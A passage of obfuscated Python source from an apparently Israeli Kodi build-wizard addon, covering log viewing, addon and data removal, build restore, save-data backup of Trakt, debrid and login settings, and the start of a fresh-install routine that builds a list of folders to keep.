			elif OOO0O0000O000OO00 ==O000O0OOOOOO0OOO0 .kodi :#line:4972
				OO0OOO00O0000O0O0 =wiz .Grab_Log (False )#line:4973
				O000000OO00OO0OOO =wiz .Grab_Log (True )#line:4974
				if OO0OOO00O0000O0O0 ==False :#line:4975
					O000O0OOOOOO0OOO0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4976
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .msg ).setText ("Log File Does Not Exists!")#line:4977
				else :#line:4978
					O000O0OOOOOO0OOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O000000OO00OO0OOO .replace (LOG ,''))#line:4979
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .title ).setLabel (O000O0OOOOOO0OOO0 .titlemsg )#line:4980
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .msg ).setText (wiz .highlightText (OO0OOO00O0000O0O0 ))#line:4981
					O000O0OOOOOO0OOO0 .setFocusId (O000O0OOOOOO0OOO0 .scrollbar )#line:4982
			elif OOO0O0000O000OO00 ==O000O0OOOOOO0OOO0 .kodiold :#line:4983
				OO0OOO00O0000O0O0 =wiz .Grab_Log (False ,True )#line:4984
				O000000OO00OO0OOO =wiz .Grab_Log (True ,True )#line:4985
				if OO0OOO00O0000O0O0 ==False :#line:4986
					O000O0OOOOOO0OOO0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4987
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .msg ).setText ("Log File Does Not Exists!")#line:4988
				else :#line:4989
					O000O0OOOOOO0OOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O000000OO00OO0OOO .replace (LOG ,''))#line:4990
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .title ).setLabel (O000O0OOOOOO0OOO0 .titlemsg )#line:4991
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .msg ).setText (wiz .highlightText (OO0OOO00O0000O0O0 ))#line:4992
					O000O0OOOOOO0OOO0 .setFocusId (O000O0OOOOOO0OOO0 .scrollbar )#line:4993
			elif OOO0O0000O000OO00 ==O000O0OOOOOO0OOO0 .wizard :#line:4994
				OO0OOO00O0000O0O0 =wiz .Grab_Log (False ,False ,True )#line:4995
				O000000OO00OO0OOO =wiz .Grab_Log (True ,False ,True )#line:4996
				if OO0OOO00O0000O0O0 ==False :#line:4997
					O000O0OOOOOO0OOO0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4998
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .msg ).setText ("Log File Does Not Exists!")#line:4999
				else :#line:5000
					O000O0OOOOOO0OOO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O000000OO00OO0OOO .replace (ADDONDATA ,''))#line:5001
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .title ).setLabel (O000O0OOOOOO0OOO0 .titlemsg )#line:5002
					O000O0OOOOOO0OOO0 .getControl (O000O0OOOOOO0OOO0 .msg ).setText (wiz .highlightText (OO0OOO00O0000O0O0 ))#line:5003
					O000O0OOOOOO0OOO0 .setFocusId (O000O0OOOOOO0OOO0 .scrollbar )#line:5004
		def onAction (O00000000O00OOOO0 ,O00O0O00OO0000OOO ):#line:5006
			if O00O0O00OO0000OOO ==ACTION_PREVIOUS_MENU :O00000000O00OOOO0 .close ()#line:5007
			elif O00O0O00OO0000OOO ==ACTION_NAV_BACK :O00000000O00OOOO0 .close ()#line:5008
	if default ==None :default =wiz .Grab_Log (True )#line:5009
	OO000O0000O00O0O0 =OO000OO000O0OO0O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5010
	OO000O0000O00O0O0 .doModal ()#line:5011
	del OO000O0000O00O0O0 #line:5012
def removeAddon (O00OO0000000O0OO0 ,OO0O0000OO0O0O0O0 ,over =False ):#line:5014
	if not over ==False :#line:5015
		OO0OOOO00OOO0OO0O =1 #line:5016
	else :#line:5017
		OO0OOOO00OOO0OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0000OO0O0O0O0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00OO0000000O0OO0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5018
	if OO0OOOO00OOO0OO0O ==1 :#line:5019
		OO0O00O0O00OOOOO0 =os .path .join (ADDONS ,O00OO0000000O0OO0 )#line:5020
		wiz .log ("Removing Addon %s"%O00OO0000000O0OO0 )#line:5021
		wiz .cleanHouse (OO0O00O0O00OOOOO0 )#line:5022
		xbmc .sleep (1000 )#line:5023
		try :shutil .rmtree (OO0O00O0O00OOOOO0 )#line:5024
		except Exception as OO00O0OOO000O0OOO :wiz .log ("Error removing %s"%O00OO0000000O0OO0 ,xbmc .LOGNOTICE )#line:5025
		removeAddonData (O00OO0000000O0OO0 ,OO0O0000OO0O0O0O0 ,over )#line:5026
	if over ==False :#line:5027
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0O0000OO0O0O0O0 ))#line:5028
def removeAddonData (O00O0O0O0OOOOO00O ,name =None ,over =False ):#line:5030
	if O00O0O0O0OOOOO00O =='all':#line:5031
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5032
			wiz .cleanHouse (ADDOND )#line:5033
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5034
	elif O00O0O0O0OOOOO00O =='uninstalled':#line:5035
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5036
			OO0O000O0O00OOOOO =0 #line:5037
			for O0000OOO0O00O0OO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:5038
				OOOO00O00OO0OOO0O =O0000OOO0O00O0OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5039
				if OOOO00O00OO0OOO0O in EXCLUDES :pass #line:5040
				elif os .path .exists (os .path .join (ADDONS ,OOOO00O00OO0OOO0O )):pass #line:5041
				else :wiz .cleanHouse (O0000OOO0O00O0OO0 );OO0O000O0O00OOOOO +=1 ;wiz .log (O0000OOO0O00O0OO0 );shutil .rmtree (O0000OOO0O00O0OO0 )#line:5042
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0O000O0O00OOOOO ))#line:5043
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5044
	elif O00O0O0O0OOOOO00O =='empty':#line:5045
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5046
			OO0O000O0O00OOOOO =wiz .emptyfolder (ADDOND )#line:5047
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO0O000O0O00OOOOO ))#line:5048
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5049
	else :#line:5050
		OOO00000OO000OO0O =os .path .join (USERDATA ,'addon_data',O00O0O0O0OOOOO00O )#line:5051
		if O00O0O0O0OOOOO00O in EXCLUDES :#line:5052
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5053
		elif os .path .exists (OOO00000OO000OO0O ):#line:5054
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O0O0OOOOO00O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5055
				wiz .cleanHouse (OOO00000OO000OO0O )#line:5056
				try :#line:5057
					shutil .rmtree (OOO00000OO000OO0O )#line:5058
				except :#line:5059
					wiz .log ("Error deleting: %s"%OOO00000OO000OO0O )#line:5060
			else :#line:5061
				wiz .log ('Addon data for %s was not removed'%O00O0O0O0OOOOO00O )#line:5062
	wiz .refresh ()#line:5063
def restoreit (OO0OOO00OOOOOOO00 ):#line:5065
	if OO0OOO00OOOOOOO00 =='build':#line:5066
		OOO00000000O0O000 =freshStart ('restore')#line:5067
		if OOO00000000O0O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5068
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:5069
		wiz .skinToDefault ()#line:5070
	wiz .restoreLocal (OO0OOO00OOOOOOO00 )#line:5071
def restoreextit (O0OOOOO0O0O00OOO0 ):#line:5073
	if O0OOOOO0O0O00OOO0 =='build':#line:5074
		OOO0O000O0OO0O0OO =freshStart ('restore')#line:5075
		if OOO0O000O0OO0O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5076
	wiz .restoreExternal (O0OOOOO0O0O00OOO0 )#line:5077
def buildInfo (OOOOOOOO000OOO00O ):#line:5079
	if wiz .workingURL (SPEEDFILE )==True :#line:5080
		if wiz .checkBuild (OOOOOOOO000OOO00O ,'url'):#line:5081
			OOOOOOOO000OOO00O ,OOO000O0OOO00OO00 ,OO0O0OO0O0OOOOO0O ,OOO0O0OO0O000O0O0 ,O0OO0O00O000O0000 ,O00O00OO0O0O0O0O0 ,OOOOOOO00OO00OO0O ,O0O0OO00OOOO0O0O0 ,O0O0OO0O00OO0O0O0 ,O0O0OOO00OO00O000 ,OO00O000OOO000O00 =wiz .checkBuild (OOOOOOOO000OOO00O ,'all')#line:5082
			O0O0OOO00OO00O000 ='Yes'if O0O0OOO00OO00O000 .lower ()=='yes'else 'No'#line:5083
			OOO0OO00OOOOOO00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOOOO000OOO00O )#line:5084
			OOO0OO00OOOOOO00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO000O0OOO00OO00 )#line:5085
			if not O00O00OO0O0O0O0O0 =="http://":#line:5086
				OO00000O000OO00O0 =wiz .themeCount (OOOOOOOO000OOO00O ,False )#line:5087
				OOO0OO00OOOOOO00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO00000O000OO00O0 ))#line:5088
			OOO0OO00OOOOOO00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0O00O000O0000 )#line:5089
			OOO0OO00OOOOOO00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OOO00OO00O000 )#line:5090
			OOO0OO00OOOOOO00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O000OOO000O00 )#line:5091
			wiz .TextBox (ADDONTITLE ,OOO0OO00OOOOOO00O )#line:5092
		else :wiz .log ("Invalid Build Name!")#line:5093
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5094
def buildVideo (O00O00O0O0000OOO0 ):#line:5096
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5097
	if wiz .workingURL (SPEEDFILE )==True :#line:5098
		OOOOOO0OOO00O00OO =wiz .checkBuild (O00O00O0O0000OOO0 ,'preview')#line:5099
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00O00O0O0000OOO0 )#line:5100
		if OOOOOO0OOO00O00OO and not OOOOOO0OOO00O00OO =='http://':playVideo (OOOOOO0OOO00O00OO )#line:5101
		else :wiz .log ("[%s]Unable to find url for video preview"%O00O00O0O0000OOO0 )#line:5102
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5103
def dependsList (OO0O0OOOO000000O0 ):#line:5105
	O0O00000OOO0O0000 =os .path .join (ADDONS ,OO0O0OOOO000000O0 ,'addon.xml')#line:5106
	if os .path .exists (O0O00000OOO0O0000 ):#line:5107
		OO0OO0O0O0O0O0000 =open (O0O00000OOO0O0000 ,mode ='r');O0OOOO0OO0000OO0O =OO0OO0O0O0O0O0000 .read ();OO0OO0O0O0O0O0000 .close ();#line:5108
		OO0O0O00OO00OOOO0 =wiz .parseDOM (O0OOOO0OO0000OO0O ,'import',ret ='addon')#line:5109
		OO0OO0OO000O000OO =[]#line:5110
		for OO0OOOO0OO0O0OO00 in OO0O0O00OO00OOOO0 :#line:5111
			if not 'xbmc.python'in OO0OOOO0OO0O0OO00 :#line:5112
				OO0OO0OO000O000OO .append (OO0OOOO0OO0O0OO00 )#line:5113
		return OO0OO0OO000O000OO #line:5114
	return []#line:5115
def manageSaveData (OO0OO0OO00O0OO0O0 ):#line:5117
	if OO0OO0OO00O0OO0O0 =='import':#line:5118
		OOOOO0OOO0O00O0O0 =os .path .join (ADDONDATA ,'temp')#line:5119
		if not os .path .exists (OOOOO0OOO0O00O0O0 ):os .makedirs (OOOOO0OOO0O00O0O0 )#line:5120
		OO0OOOOO00OOOO00O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5121
		if not OO0OOOOO00OOOO00O .endswith ('.zip'):#line:5122
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5123
			return #line:5124
		OOO0OO00OOO0OOO0O =os .path .join (MYBUILDS ,'SaveData.zip')#line:5125
		O000000O00O0000OO =xbmcvfs .copy (OO0OOOOO00OOOO00O ,OOO0OO00OOO0OOO0O )#line:5126
		wiz .log ("%s"%str (O000000O00O0000OO ))#line:5127
		extract .all (xbmc .translatePath (OOO0OO00OOO0OOO0O ),OOOOO0OOO0O00O0O0 )#line:5128
		OO00OOOOO0OO00O00 =os .path .join (OOOOO0OOO0O00O0O0 ,'trakt')#line:5129
		O00O00O0O0OO0OOOO =os .path .join (OOOOO0OOO0O00O0O0 ,'login')#line:5130
		O0O0O0O00000OO0OO =os .path .join (OOOOO0OOO0O00O0O0 ,'debrid')#line:5131
		OO00OOO0O00O00O0O =0 #line:5132
		if os .path .exists (OO00OOOOO0OO00O00 ):#line:5133
			OO00OOO0O00O00O0O +=1 #line:5134
			O0000O0000O000O00 =os .listdir (OO00OOOOO0OO00O00 )#line:5135
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5136
			for OO0O00OOO000O0O00 in O0000O0000O000O00 :#line:5137
				O0O0OO0OOOOOOO00O =os .path .join (traktit .TRAKTFOLD ,OO0O00OOO000O0O00 )#line:5138
				O0OO0OO0000O00O00 =os .path .join (OO00OOOOO0OO00O00 ,OO0O00OOO000O0O00 )#line:5139
				if os .path .exists (O0O0OO0OOOOOOO00O ):#line:5140
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O00OOO000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5141
					else :os .remove (O0O0OO0OOOOOOO00O )#line:5142
				shutil .copy (O0OO0OO0000O00O00 ,O0O0OO0OOOOOOO00O )#line:5143
			traktit .importlist ('all')#line:5144
			traktit .traktIt ('restore','all')#line:5145
		if os .path .exists (O00O00O0O0OO0OOOO ):#line:5146
			OO00OOO0O00O00O0O +=1 #line:5147
			O0000O0000O000O00 =os .listdir (O00O00O0O0OO0OOOO )#line:5148
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5149
			for OO0O00OOO000O0O00 in O0000O0000O000O00 :#line:5150
				O0O0OO0OOOOOOO00O =os .path .join (loginit .LOGINFOLD ,OO0O00OOO000O0O00 )#line:5151
				O0OO0OO0000O00O00 =os .path .join (O00O00O0O0OO0OOOO ,OO0O00OOO000O0O00 )#line:5152
				if os .path .exists (O0O0OO0OOOOOOO00O ):#line:5153
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O00OOO000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5154
					else :os .remove (O0O0OO0OOOOOOO00O )#line:5155
				shutil .copy (O0OO0OO0000O00O00 ,O0O0OO0OOOOOOO00O )#line:5156
			loginit .importlist ('all')#line:5157
			loginit .loginIt ('restore','all')#line:5158
		if os .path .exists (O0O0O0O00000OO0OO ):#line:5159
			OO00OOO0O00O00O0O +=1 #line:5160
			O0000O0000O000O00 =os .listdir (O0O0O0O00000OO0OO )#line:5161
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5162
			for OO0O00OOO000O0O00 in O0000O0000O000O00 :#line:5163
				O0O0OO0OOOOOOO00O =os .path .join (debridit .REALFOLD ,OO0O00OOO000O0O00 )#line:5164
				O0OO0OO0000O00O00 =os .path .join (O0O0O0O00000OO0OO ,OO0O00OOO000O0O00 )#line:5165
				if os .path .exists (O0O0OO0OOOOOOO00O ):#line:5166
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O00OOO000O0O00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5167
					else :os .remove (O0O0OO0OOOOOOO00O )#line:5168
				shutil .copy (O0OO0OO0000O00O00 ,O0O0OO0OOOOOOO00O )#line:5169
			debridit .importlist ('all')#line:5170
			debridit .debridIt ('restore','all')#line:5171
		wiz .cleanHouse (OOOOO0OOO0O00O0O0 )#line:5172
		wiz .removeFolder (OOOOO0OOO0O00O0O0 )#line:5173
		os .remove (OOO0OO00OOO0OOO0O )#line:5174
		if OO00OOO0O00O00O0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5175
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5176
	elif OO0OO0OO00O0OO0O0 =='export':#line:5177
		OO00OOO0O0O00O0OO =xbmc .translatePath (MYBUILDS )#line:5178
		OOO0O0O0OO00O0OOO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5179
		traktit .traktIt ('update','all')#line:5180
		loginit .loginIt ('update','all')#line:5181
		debridit .debridIt ('update','all')#line:5182
		OO0OOOOO00OOOO00O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5183
		OO0OOOOO00OOOO00O =xbmc .translatePath (OO0OOOOO00OOOO00O )#line:5184
		OO0OOOO0OO0O0OOOO =os .path .join (OO00OOO0O0O00O0OO ,'SaveData.zip')#line:5185
		O0O000OOO0O0OO000 =zipfile .ZipFile (OO0OOOO0OO0O0OOOO ,mode ='w')#line:5186
		for O0OOO00O0OO000O0O in OOO0O0O0OO00O0OOO :#line:5187
			if os .path .exists (O0OOO00O0OO000O0O ):#line:5188
				O0000O0000O000O00 =os .listdir (O0OOO00O0OO000O0O )#line:5189
				for OOOO0O00OO0000O0O in O0000O0000O000O00 :#line:5190
					O0O000OOO0O0OO000 .write (os .path .join (O0OOO00O0OO000O0O ,OOOO0O00OO0000O0O ),os .path .join (O0OOO00O0OO000O0O ,OOOO0O00OO0000O0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5191
		O0O000OOO0O0OO000 .close ()#line:5192
		if OO0OOOOO00OOOO00O ==OO00OOO0O0O00O0OO :#line:5193
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOO0OO0O0OOOO ))#line:5194
		else :#line:5195
			try :#line:5196
				xbmcvfs .copy (OO0OOOO0OO0O0OOOO ,os .path .join (OO0OOOOO00OOOO00O ,'SaveData.zip'))#line:5197
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO0OOOOO00OOOO00O ,'SaveData.zip')))#line:5198
			except :#line:5199
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOO0OO0O0OOOO ))#line:5200
def freshStart (install =None ,over =False ):#line:5205
	if USERNAME =='':#line:5206
		ADDON .openSettings ()#line:5207
		sys .exit ()#line:5208
	O0OOOO0OOOO00O0OO =(SPEEDFILE )#line:5209
	(O0OOOO0OOOO00O0OO )#line:5210
	O00O0OOOO00000O00 =(wiz .workingURL (O0OOOO0OOOO00O0OO ))#line:5211
	(O00O0OOOO00000O00 )#line:5212
	if KEEPTRAKT =='true':#line:5213
		traktit .autoUpdate ('all')#line:5214
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5215
	if KEEPREAL =='true':#line:5216
		debridit .autoUpdate ('all')#line:5217
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5218
	if KEEPLOGIN =='true':#line:5219
		loginit .autoUpdate ('all')#line:5220
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5221
	if over ==True :O0O0O00OOO0OOO0OO =1 #line:5222
	elif install =='restore':O0O0O00OOO0OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5223
	elif install :O0O0O00OOO0OOO0OO =1 #line:5224
	else :O0O0O00OOO0OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5225
	if O0O0O00OOO0OOO0OO :#line:5226
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5227
			OO0OO00O0O0000O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5228
			skinSwitch .swapSkins (OO0OO00O0O0000O0O )#line:5231
			O0O00OO00OO0OOOOO =0 #line:5232
			xbmc .sleep (1000 )#line:5233
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00OO00OO0OOOOO <150 :#line:5234
				O0O00OO00OO0OOOOO +=1 #line:5235
				xbmc .sleep (1000 )#line:5236
				wiz .ebi ('SendAction(Select)')#line:5237
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5238
				wiz .ebi ('SendClick(11)')#line:5239
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5240
			xbmc .sleep (1000 )#line:5241
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5242
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5243
			return #line:5244
		wiz .addonUpdates ('set')#line:5245
		O00O0OOO0OOOO000O =os .path .abspath (HOME )#line:5246
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5247
		O00O0000OOOO0O000 =sum ([len (OOO0OO000OOOOO0OO )for O0O00O0000OOOO000 ,OOO0000OOO0OOO0OO ,OOO0OO000OOOOO0OO in os .walk (O00O0OOO0OOOO000O )]);OO0OO0OO0O0OOOO0O =0 #line:5248
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5249
		EXCLUDES .append ('My_Builds')#line:5250
		EXCLUDES .append ('archive_cache')#line:5251
		EXCLUDES .append ('script.module.requests')#line:5252
		EXCLUDES .append ('myfav.anon')#line:5253
		if KEEPREPOS =='true':#line:5254
			O0O0O0OOOOO0OO000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5255
			for O0O00000O00OO00OO in O0O0O0OOOOO0OO000 :#line:5256
				O00O0000O0O0O00OO =os .path .split (O0O00000O00OO00OO [:-1 ])[1 ]#line:5257
				if not O00O0000O0O0O00OO ==EXCLUDES :#line:5258
					EXCLUDES .append (O00O0000O0O0O00OO )#line:5259
		if KEEPSUPER =='true':#line:5260
			EXCLUDES .append ('plugin.program.super.favourites')#line:5261
		if KEEPMOVIELIST =='true':#line:5262
			EXCLUDES .append ('plugin.video.metalliq')#line:5263
		if KEEPMOVIELIST =='true':#line:5264
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5265
		if KEEPADDONS =='true':#line:5266
			EXCLUDES .append ('addons')#line:5267
		if KEEPTELEMEDIA =='true':#line:5268
			EXCLUDES .append ('plugin.video.telemedia')#line:5269
		EXCLUDES .append ('plugin.video.elementum')#line:5274
		EXCLUDES .append ('script.elementum.burst')#line:5275
		EXCLUDES .append ('script.elementum.burst-master')#line:5276
		EXCLUDES .append ('plugin.video.quasar')#line:5277
		EXCLUDES .append ('script.quasar.burst')#line:5278
		EXCLUDES .append ('skin.estuary')#line:5279
		if KEEPWHITELIST =='true':#line:5282
			O0OOO0OO0000OOOOO =''#line:5283
			O000OOO00OOOOOOO0 =wiz .whiteList ('read')#line:5284
			if len (O000OOO00OOOOOOO0 )>0 :#line:5285
				for O0O00000O00OO00OO in O000OOO00OOOOOOO0 :#line:5286
					try :OO0OO0O0OO0OO00OO ,O000OO00O0O00000O ,O000OO0OO00000000 =O0O00000O00OO00OO #line:5287
					except :pass #line:5288
					if O000OO0OO00000000 .startswith ('pvr'):O0OOO0OO0000OOOOO =O000OO00O0O00000O #line:5289
					O0O00O000OOOO0OOO =dependsList (O000OO0OO00000000 )#line:5290
					for OOOO0OO0O0OO0O0OO in O0O00O000OOOO0OOO :#line:5291
						if not OOOO0OO0O0OO0O0OO in EXCLUDES :#line:5292
							EXCLUDES .append (OOOO0OO0O0OO0O0OO )#line:5293
						OO0O0000OO00O0OO0 =dependsList (OOOO0OO0O0OO0O0OO )#line:5294
						for OO0O00OO00O0OOOO0 in OO0O0000OO00O0OO0 :#line:5295
							if not OO0O00OO00O0OOOO0 in EXCLUDES :#line:5296
								EXCLUDES .append (OO0O00OO00O0OOOO0 )#line:5297
					if not O000OO0OO00000000 in EXCLUDES :#line:5298
						EXCLUDES .append (O000OO0OO00000000 )#line:5299
				if not O0OOO0OO0000OOOOO =='':wiz .setS ('pvrclient',O000OO0OO00000000 )#line:5300
		if wiz .getS ('pvrclient')=='':#line:5301
			for O0O00000O00OO00OO in EXCLUDES :#line:5302
